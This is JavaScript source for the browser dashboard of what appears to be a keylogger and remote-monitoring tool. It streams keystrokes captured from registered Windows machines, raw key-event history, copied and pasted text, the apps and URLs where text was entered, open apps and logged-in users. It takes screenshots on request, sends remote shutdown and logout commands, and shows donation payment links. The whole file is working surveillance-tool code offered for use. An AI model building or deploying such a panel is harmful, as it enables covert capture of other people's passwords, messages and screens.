import { fetchJson, postJson } from './parts/api.js';
import { formatAge, formatTime, formatUptime } from './parts/formatters.js';

const feed = document.getElementById('feed');
    const statusEl = document.getElementById('status');
    const startedAtEl = document.getElementById('startedAt');
    const uptimeEl = document.getElementById('uptime');
    const messageCountEl = document.getElementById('messageCount');
    const deviceCountEl = document.getElementById('deviceCount');
    const onlineCountEl = document.getElementById('onlineCount');
    const deviceUpdatedEl = document.getElementById('deviceUpdated');
    const deviceListEl = document.getElementById('deviceList');
    const openAppsDeviceEl = document.getElementById('openAppsDevice');
    const openAppsListEl = document.getElementById('openAppsList');
    const supportLinkEl = document.getElementById('supportLink');
    const paymentListEl = document.getElementById('paymentList');
    const scopeLabelEl = document.getElementById('scopeLabel');
    const messageSearchEl = document.getElementById('messageSearch');
    const rawHistoryControlsEl = document.getElementById('rawHistoryControls');
    const rawDeviceFilterEl = document.getElementById('rawDeviceFilter');
    const rawSessionFilterEl = document.getElementById('rawSessionFilter');
    const rawStartFilterEl = document.getElementById('rawStartFilter');
    const rawEndFilterEl = document.getElementById('rawEndFilter');
    const controlsPanelEl = document.getElementById('controlsPanel');
    const controlsDeviceEl = document.getElementById('controlsDevice');
    const controlsStatusEl = document.getElementById('controlsStatus');
    const shutdownButtonEl = document.getElementById('shutdownButton');
    const logoutClientButtonEl = document.getElementById('logoutClientButton');
    const refreshButtonEl = document.getElementById('refreshButton');
    const deviceUptimes = new Map();
    const deviceOnlineStates = new Map();
    const deviceClocks = new Map();
    const selectedDeviceId = new URLSearchParams(window.location.search).get('device') || '';
    let displayMode = 'filtered';
    let currentMessages = [];
    let eventSource = null;
    let serviceStartedAt = null;
    let serviceUptime = 0;
    let renderQueued = false;
    let rawHistory = [];
    let lastDeviceSignature = '';
    let panelRequestId = 0;
    let screenshotSignature = null;
    function updateUptime() {
      if (serviceStartedAt === null) return;
      serviceUptime += 1;
      uptimeEl.textContent = formatUptime(serviceUptime);
    }

    function updateDeviceUptimes() {
      document.querySelectorAll('.device-uptime').forEach((uptimeEl) => {
        const deviceId = uptimeEl.dataset.deviceId;
        let seconds = deviceUptimes.get(deviceId);
        if (seconds === undefined) return;
        if (deviceOnlineStates.get(deviceId)) {
          seconds += 1;
          deviceUptimes.set(deviceId, seconds);
        }
        uptimeEl.textContent = `Uptime: ${formatUptime(seconds)}`;
      });
      document.querySelectorAll('.device-local-time').forEach((timeEl) => {
        const deviceId = timeEl.dataset.deviceId;
        const clock = deviceClocks.get(deviceId);
        if (!clock) return;
        const elapsed = Date.now() - clock.receivedAt;
        timeEl.textContent = `Device time ${new Date(clock.timeMs + elapsed).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`;
      });
    }

    function renderOpenApps(devices) {
      const device = devices.find((item) => String(item.id) === selectedDeviceId);
      openAppsListEl.innerHTML = '';
      if (!device) {
        openAppsDeviceEl.textContent = 'Select a device';
        const item = document.createElement('li');
        item.textContent = 'Select a device to view open apps';
        openAppsListEl.appendChild(item);
        return;
      }
      openAppsDeviceEl.textContent = `${device.name || 'Unknown device'} Â· ${device.id}`;
      const apps = Array.isArray(device.open_apps) ? device.open_apps : [];
      if (!apps.length) {
        const item = document.createElement('li');
        item.textContent = device.online
          ? 'No app telemetry yet. Install the updated client.'
          : 'Device offline';
        openAppsListEl.appendChild(item);
        return;
      }
      apps.forEach((app) => {
        const item = document.createElement('li');
        item.textContent = app;
        openAppsListEl.appendChild(item);
      });
    }

    function renderPaymentMethods(paymentMethods) {
      paymentListEl.innerHTML = '';
      paymentMethods
        .filter((method) => method.value)
        .forEach((method) => {
          const item = document.createElement('div');
          item.className = 'payment-item';

          const details = document.createElement('div');
          details.className = 'payment-details';
          const name = document.createElement('span');
          name.className = 'payment-name';
          name.textContent = method.name;
          const value = document.createElement('span');
          value.className = 'payment-value';
          value.textContent = method.value;
          details.append(name, value);

          const copyButton = document.createElement('button');
          copyButton.className = 'copy-payment';
          copyButton.type = 'button';
          copyButton.textContent = 'Copy';
          copyButton.addEventListener('click', async () => {
            try {
              await navigator.clipboard.writeText(method.value);
              copyButton.textContent = 'Copied';
              setTimeout(() => { copyButton.textContent = 'Copy'; }, 1400);
            } catch (err) {
              copyButton.textContent = 'Select';
            }
          });

          item.append(details, copyButton);
          paymentListEl.appendChild(item);
        });
    }

    async function loadConfig() {
      try {
        const config = await fetchJson('/api/config');
        if (config.buy_me_a_coffee_url) supportLinkEl.href = config.buy_me_a_coffee_url;
        renderPaymentMethods(config.payment_methods || []);
        if (!config.buy_me_a_coffee_url && config.payment_methods?.length) {
          supportLinkEl.textContent = 'Support options';
          supportLinkEl.removeAttribute('href');
        }
      } catch (err) {
        // Keep the editable placeholder link when optional config is unavailable.
      }
    }

    async function loadDevices() {
      try {
        const devices = await fetchJson('/api/devices');
        renderOpenApps(devices);
        deviceCountEl.textContent = devices.length;
        onlineCountEl.textContent = `${devices.filter((device) => device.online).length} online`;
        deviceUpdatedEl.textContent = `Updated ${new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' })}`;
        devices.forEach((device) => {
          const deviceId = String(device.id || 'unknown');
          deviceUptimes.set(deviceId, Number(device.uptime_seconds) || 0);
          deviceOnlineStates.set(deviceId, Boolean(device.online));
          if (Number.isFinite(Number(device.local_time_ms)) && Number(device.local_time_ms) >= 100000000000) {
            const nextTime = Number(device.local_time_ms);
            const currentClock = deviceClocks.get(deviceId);
            if (!currentClock || Math.abs(currentClock.timeMs - nextTime) > 2000) {
              deviceClocks.set(deviceId, { timeMs: nextTime, receivedAt: Date.now() });
            }
          }
        });
        const deviceSignature = JSON.stringify(devices.map((device) => ({
          id: device.id,
          name: device.name,
          online: device.online,
          status: device.status,
          open_apps: device.open_apps,
          local_time_ms: device.local_time_ms,
          logged_in_user: device.logged_in_user,
          battery_percent: device.battery_percent,
          battery_status: device.battery_status,
          screenshot_status: device.screenshot_status,
          screenshot_message: device.screenshot_message,
        })));
        if (deviceSignature === lastDeviceSignature) return;
        lastDeviceSignature = deviceSignature;
        deviceListEl.innerHTML = '';
        if (!devices.length) {
          deviceListEl.innerHTML = '<span class="device-seen">No devices registered</span>';
          return;
        }
        devices.forEach((device) => {
          const deviceId = String(device.id || 'unknown');
          const row = document.createElement('div');
          row.className = `device-row${device.online ? ' online' : ''}${deviceId === selectedDeviceId ? ' selected' : ''}`;
          row.addEventListener('click', () => {
            window.location.href = `/?device=${encodeURIComponent(deviceId)}`;
          });

          const name = document.createElement('span');
          name.className = 'device-name';
          name.textContent = device.name || 'Unknown device';

          const id = document.createElement('span');
          id.className = 'device-id';
          id.textContent = `ID: ${device.id || 'unknown'}`;

          const state = document.createElement('span');
          state.className = `device-state ${device.online ? 'online' : 'offline'}`;
          state.textContent = device.status || (device.online ? 'Online' : 'Offline');

          const uptime = document.createElement('span');
          uptime.className = 'device-seen device-uptime';
          uptime.dataset.deviceId = deviceId;
          uptime.textContent = `Uptime: ${formatUptime(deviceUptimes.get(deviceId))}`;

          const seen = document.createElement('span');
          seen.className = 'device-seen';
          seen.textContent = device.last_seen
            ? `Last seen ${formatAge(device.last_seen_age_seconds || 0)}`
            : 'Last seen unknown';

          const joined = document.createElement('span');
          joined.className = 'device-seen';
          joined.textContent = device.joined_at
            ? `Joined ${formatTime(device.joined_at)}`
            : 'Joined date unknown';

          const localTime = document.createElement('span');
          localTime.className = 'device-seen device-local-time';
          localTime.dataset.deviceId = deviceId;
          const validDeviceTime = Number(device.local_time_ms) >= 100000000000;
          localTime.textContent = validDeviceTime
            ? `Device time ${new Date(Number(device.local_time_ms)).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`
            : device.local_time
              ? `Device time ${device.local_time}`
              : 'Device time unavailable';

          const user = document.createElement('span');
          user.className = 'device-seen';
          user.textContent = `Logged in as ${device.logged_in_user || 'Unknown user'}`;

          const battery = document.createElement('span');
          battery.className = 'device-seen';
          const batteryPercent = device.battery_percent == null ? '' : ` ${device.battery_percent}%`;
          battery.textContent = `Battery: ${device.battery_status || 'Unknown'}${batteryPercent}`;

          const actions = document.createElement('div');
          actions.className = 'device-actions';
          const screenshotButton = document.createElement('button');
          screenshotButton.className = 'screenshot-request';
          screenshotButton.type = 'button';
          screenshotButton.textContent = device.screenshot_status || 'Screenshot';
          screenshotButton.disabled = !device.online || ['Requested', 'Taking screenshot'].includes(device.screenshot_status);
          screenshotButton.addEventListener('click', async (event) => {
            event.stopPropagation();
            screenshotButton.disabled = true;
            screenshotButton.textContent = 'Requesting...';
            try {
              const response = await fetch(`/api/devices/${encodeURIComponent(deviceId)}/screenshot`, { method: 'POST' });
              if (!response.ok) throw new Error('request failed');
              screenshotButton.textContent = 'Requested';
            } catch (err) {
              screenshotButton.textContent = 'Retry';
              screenshotButton.disabled = false;
            }
          });
          actions.appendChild(screenshotButton);
          const screenshotStatus = document.createElement('span');
          screenshotStatus.className = `screenshot-status ${(device.screenshot_status || '').toLowerCase().replaceAll(' ', '-')}`;
          screenshotStatus.textContent = device.screenshot_message || 'Ready to capture';
          actions.appendChild(screenshotStatus);
          row.append(name, id, state, uptime, seen, joined, localTime, user, battery, actions);
          deviceListEl.appendChild(row);
        });
      } catch (err) {
        if (!lastDeviceSignature) deviceListEl.innerHTML = '<span class="device-seen">Unavailable</span>';
      }
    }

    async function loadHealth() {
      try {
        const health = await fetchJson('/health');
        serviceStartedAt = health.started_at;
        serviceUptime = health.uptime_seconds;
        startedAtEl.textContent = formatTime(serviceStartedAt);
        messageCountEl.textContent = health.count;
        updateUptime();
      } catch (err) {
        startedAtEl.textContent = 'Unavailable';
        uptimeEl.textContent = 'Unavailable';
      }
    }

    function addMessage(msg) {
      if (displayMode === 'filtered' && msg.raw_only) return;
      const wrap = document.createElement('div');
      wrap.className = 'bubble-wrap';

      const bubble = document.createElement('div');
      const bubbleType = msg.is_pasted ? 'pasted' : (msg.is_copied ? 'copied' : '');
      bubble.className = `bubble${bubbleType ? ` ${bubbleType}` : ''}`;
      bubble.textContent = displayMode === 'raw' ? (msg.raw_text || msg.text) : msg.text;

      if (msg.is_pasted || msg.is_copied) {
        const label = document.createElement('span');
        label.className = 'paste-label';
        label.textContent = msg.is_copied ? 'Copied' : 'Pasted';
        bubble.prepend(label);
      }

      const time = document.createElement('span');
      time.className = 'time';
      time.textContent = formatTime(msg.time);
      bubble.appendChild(time);

      const device = document.createElement('span');
      device.className = 'device';
      device.textContent = `From device ${msg.device_id || 'unknown'}${msg.device_name ? ` (${msg.device_name})` : ''}`;
      bubble.appendChild(device);

      const source = document.createElement('span');
      source.className = 'source';
      source.textContent = `Entered in: ${msg.app_name || 'Unknown app'}`;
      bubble.appendChild(source);

      if (msg.source_url) {
        const sourceLinkRow = document.createElement('div');
        sourceLinkRow.className = 'source-link-row';
        const sourceLink = document.createElement('a');
        sourceLink.className = 'source-link';
        sourceLink.href = msg.source_url;
        sourceLink.target = '_blank';
        sourceLink.rel = 'noopener noreferrer';
        sourceLink.title = msg.source_url;
        sourceLink.textContent = msg.source_url;

        const copySourceButton = document.createElement('button');
        copySourceButton.className = 'copy-source';
        copySourceButton.type = 'button';
        copySourceButton.textContent = 'Copy link';
        copySourceButton.addEventListener('click', async () => {
          try {
            await navigator.clipboard.writeText(msg.source_url);
            copySourceButton.textContent = 'Copied';
            setTimeout(() => { copySourceButton.textContent = 'Copy link'; }, 1400);
          } catch (err) {
            copySourceButton.textContent = 'Select';
          }
        });

        sourceLinkRow.append(sourceLink, copySourceButton);
        bubble.appendChild(sourceLinkRow);
      }

      wrap.appendChild(bubble);
      return wrap;
    }

    function visibleMessages() {
      const search = messageSearchEl.value.trim().toLowerCase();
      const matchesSearch = (msg) => {
        if (!search) return true;
        return [msg.text, msg.raw_text, msg.device_name, msg.device_id, msg.app_name]
          .some((value) => String(value || '').toLowerCase().includes(search));
      };
      if (displayMode === 'raw') {
        const rawMessages = currentMessages.filter((msg) => msg.raw_only && matchesSearch(msg));
        return rawMessages.length ? rawMessages : currentMessages.filter(matchesSearch);
      }
      return currentMessages.filter((msg) => !msg.raw_only && matchesSearch(msg));
    }

    function updateMessageCount() {
      messageCountEl.textContent = visibleMessages().length;
    }

    function queueFeedRender() {
      if (renderQueued) return;
      renderQueued = true;
      requestAnimationFrame(() => {
        renderQueued = false;
        renderFeed();
      });
    }

    function renderFeed() {
      feed.innerHTML = '';
      if (displayMode === 'raw-history') {
        const fragment = document.createDocumentFragment();
        rawHistory.forEach((batch) => {
          const section = document.createElement('section');
          section.className = 'raw-batch';
          const heading = document.createElement('header');
          heading.className = 'raw-batch-heading';
          heading.textContent = `${formatTime(batch.started_at)} - ${formatTime(batch.ended_at)} | ${batch.device_name} | ${batch.event_count} events`;
          const session = document.createElement('span');
          session.textContent = `Session ${batch.session_id}`;
          heading.appendChild(session);
          section.appendChild(heading);
          batch.events.forEach((event) => {
            const row = document.createElement('div');
            row.className = 'raw-event';
            const time = document.createElement('time');
            time.textContent = formatTime(event.time);
            const key = document.createElement('code');
            key.textContent = event.key;
            const app = document.createElement('span');
            app.textContent = event.app_name || 'Unknown app';
            row.append(time, key, app);
            section.appendChild(row);
          });
          fragment.appendChild(section);
        });
        feed.appendChild(fragment);
        messageCountEl.textContent = rawHistory.reduce((count, batch) => count + batch.event_count, 0);
        feed.scrollTop = 0;
        return;
      }
      if (displayMode === 'raw') {
        const rawLog = document.createElement('pre');
        rawLog.className = 'raw-log';
        rawLog.textContent = visibleMessages()
          .map((msg) => msg.raw_text || msg.text)
          .join('');
        feed.appendChild(rawLog);
        updateMessageCount();
        feed.scrollTop = feed.scrollHeight;
        return;
      }
      const fragment = document.createDocumentFragment();
      visibleMessages().forEach((msg) => fragment.appendChild(addMessage(msg)));
      feed.appendChild(fragment);
      updateMessageCount();
      feed.scrollTop = feed.scrollHeight;
    }

    async function loadInitialMessages() {
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const messages = await fetchJson(`/messages${query}`);
        currentMessages = messages;
        renderFeed();
        statusEl.textContent = selectedDeviceId ? 'Device filtered keys: ' + visibleMessages().length : 'Latest filtered keys: ' + visibleMessages().length;
        return true;
      } catch (err) {
        statusEl.textContent = 'Listening for filtered keysâ€¦';
        return false;
      }
    }

    async function loadRawHistory() {
      const requestId = ++panelRequestId;
      showFeedLoader('Loading raw history');
      const params = new URLSearchParams();
      const deviceId = rawDeviceFilterEl.value.trim() || selectedDeviceId;
      if (deviceId) params.set('device_id', deviceId);
      if (rawSessionFilterEl.value.trim()) params.set('session_id', rawSessionFilterEl.value.trim());
      if (rawStartFilterEl.value) params.set('start_time', String(new Date(rawStartFilterEl.value).getTime()));
      if (rawEndFilterEl.value) params.set('end_time', String(new Date(rawEndFilterEl.value).getTime()));
      params.set('limit', '100');
      try {
        rawHistory = await fetchJson(`/api/raw-history?${params}`);
        if (requestId !== panelRequestId) return;
        renderFeed();
        statusEl.textContent = `Raw history: ${rawHistory.length} batches`;
      } catch (err) {
        rawHistory = [];
        renderFeed();
        statusEl.textContent = 'Raw history unavailable';
      }
    }

    async function loadScreenshots() {
      const requestId = ++panelRequestId;
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const screenshots = await fetchJson(`/api/screenshots${query}`);
        if (requestId !== panelRequestId) return;
        const nextSignature = screenshots.map((item) => item.id).join(',');
        if (nextSignature === screenshotSignature) return;
        screenshotSignature = nextSignature;
        feed.innerHTML = '';
        if (!screenshots.length) {
          feed.innerHTML = '<span class="device-seen">No screenshots saved</span>';
        } else {
          const grid = document.createElement('div');
          grid.className = 'screenshot-grid';
          screenshots.forEach((item) => {
            const card = document.createElement('article');
            card.className = 'screenshot-card';
            const image = document.createElement('img');
            image.src = item.image_url;
            image.alt = `Screenshot from ${item.device_name}`;
            image.loading = 'lazy';
            image.addEventListener('load', () => image.classList.add('loaded'));
            image.addEventListener('error', () => {
              image.classList.add('loaded');
              image.alt = 'Screenshot unavailable';
            });
            image.addEventListener('click', () => window.open(item.image_url, '_blank', 'noopener'));
            const device = document.createElement('strong');
            device.textContent = `${item.device_name} (${item.device_id})`;
            const time = document.createElement('span');
            time.textContent = formatTime(item.captured_at);
            card.append(image, device, time);
            grid.appendChild(card);
          });
          feed.appendChild(grid);
        }
        messageCountEl.textContent = screenshots.length;
        statusEl.textContent = `Screenshots: ${screenshots.length}`;
      } catch (err) {
        feed.innerHTML = '<span class="device-seen">Screenshots unavailable</span>';
        statusEl.textContent = 'Screenshots unavailable';
      }
    }

    function showFeedLoader(label) {
      feed.innerHTML = '';
      const loader = document.createElement('div');
      loader.className = 'feed-loader';
      loader.textContent = label;
      feed.appendChild(loader);
    }

    function connectEvents() {
      const params = new URLSearchParams();
      if (selectedDeviceId) params.set('device_id', selectedDeviceId);
      const lastMessageId = currentMessages.reduce((latest, msg) => Math.max(latest, Number(msg.id) || 0), 0);
      if (lastMessageId) params.set('since', String(lastMessageId));
      const query = params.toString() ? `?${params.toString()}` : '';
      eventSource = new EventSource(`/events${query}`);
      eventSource.onmessage = (event) => {
        currentMessages.push(JSON.parse(event.data));
        if (currentMessages.length > 200) currentMessages.shift();
        queueFeedRender();
        statusEl.textContent = 'Live stream connected';
      };
      eventSource.onerror = () => {
        statusEl.textContent = 'Reconnect in progressâ€¦';
      };
    }

    document.querySelectorAll('[data-mode]').forEach((button) => {
      button.addEventListener('click', async () => {
        panelRequestId += 1;
        displayMode = button.dataset.mode;
        button.setAttribute('aria-busy', 'true');
        document.querySelectorAll('[data-mode]').forEach((item) => item.classList.toggle('active', item === button));
        rawHistoryControlsEl.hidden = displayMode !== 'raw-history';
        controlsPanelEl.hidden = displayMode !== 'controls';
        if (displayMode === 'raw-history') {
          if (eventSource) eventSource.close();
          await loadRawHistory();
        } else if (displayMode === 'screenshots') {
          if (eventSource) eventSource.close();
          await loadScreenshots();
        } else if (displayMode === 'controls') {
          if (eventSource) eventSource.close();
          feed.innerHTML = '';
          statusEl.textContent = 'Basic controls';
        } else {
          if (!eventSource || eventSource.readyState === EventSource.CLOSED) connectEvents();
          renderFeed();
        }
        button.removeAttribute('aria-busy');
      });
    });

    rawHistoryControlsEl.addEventListener('submit', (event) => {
      event.preventDefault();
      loadRawHistory();
    });

    async function requestClientCommand(command, button, confirmation) {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!window.confirm(confirmation)) return;
      button.disabled = true;
      controlsStatusEl.textContent = `Requesting client ${command}...`;
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, { command });
        controlsStatusEl.textContent = `Client ${command} requested.`;
      } catch (err) {
        button.disabled = false;
        controlsStatusEl.textContent = `Client ${command} failed.`;
      }
    }

    shutdownButtonEl.addEventListener('click', () => requestClientCommand(
      'shutdown', shutdownButtonEl, 'Shut down the selected client computer?'
    ));
    logoutClientButtonEl.addEventListener('click', () => requestClientCommand(
      'logout', logoutClientButtonEl, 'Log out the selected Windows user?'
    ));

    refreshButtonEl.addEventListener('click', () => window.location.reload());

    messageSearchEl.addEventListener('input', queueFeedRender);
    window.addEventListener('keydown', (event) => {
      if (event.key === '/' && document.activeElement !== messageSearchEl) {
        event.preventDefault();
        messageSearchEl.focus();
      }
    });

    scopeLabelEl.textContent = selectedDeviceId ? `Device ${selectedDeviceId}` : 'All devices';
    controlsDeviceEl.textContent = selectedDeviceId
      ? `Selected device: ${selectedDeviceId}`
      : 'Select a device from the device list to enable client actions.';
    async function startApp() {
      await loadInitialMessages();
      connectEvents();
      loadConfig();
      loadHealth();
      loadDevices();
    }

    startApp();
    setInterval(updateUptime, 1000);
    setInterval(updateDeviceUptimes, 1000);
    setInterval(loadHealth, 30000);
    setInterval(loadDevices, 3000);
    setInterval(() => {
      if (displayMode === 'screenshots') loadScreenshots();
    }, 15000);

